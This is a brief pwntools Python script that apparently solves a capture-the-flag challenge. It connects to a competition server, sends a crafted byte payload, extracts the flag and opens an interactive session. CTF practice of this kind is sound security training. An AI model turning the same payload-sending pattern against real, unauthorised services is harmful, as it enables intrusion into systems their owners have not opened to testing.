from pwn import *
host = 'ctf2021.hackpack.club'
port = 10998
io = connect(host,port)
io.sendline(b'H\x01\x01H')
io.recvuntil('flag')
log.success("flag:"+'flag'+io.recvline().decode())
io.interactive()